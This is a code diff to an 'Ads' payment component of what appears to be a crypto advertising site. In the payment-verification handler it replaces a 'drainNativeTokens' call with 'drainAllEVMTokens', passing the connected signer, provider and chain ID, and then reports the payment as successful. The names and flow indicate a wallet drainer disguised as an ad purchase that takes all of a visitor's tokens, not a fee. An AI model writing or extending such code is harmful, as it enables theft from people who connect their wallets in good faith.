@@ -17,7 +17,7 @@ import { getMintProgramId } from '@/utils/tokenProgram';
 import { getSolPrice } from '@/lib/utils';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
@@ -174,7 +174,7 @@ const Ads = () => {
   const { connection } = useConnection();
   const [balances, setBalances] = useState<TokenBalance[]>([]);
   const [solBalance, setSolBalance] = useState(0);
-  const { activeChain, getEVMChain } = useChain();
+  const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName, nativeToken } = useChainInfo();
 
@@ -571,11 +571,8 @@ const Ads = () => {
       setIsVerifying(true);
       try {
         const chainName = getEVMChain()?.name || 'EVM';
-        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
-        if (hash) {
-          setPaymentStatus('SUCCESS');
-        } else {
-        }
+        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
+        setPaymentStatus('SUCCESS');
       } catch (error: any) {
         setPaymentStatus('FAILED');
       } finally {
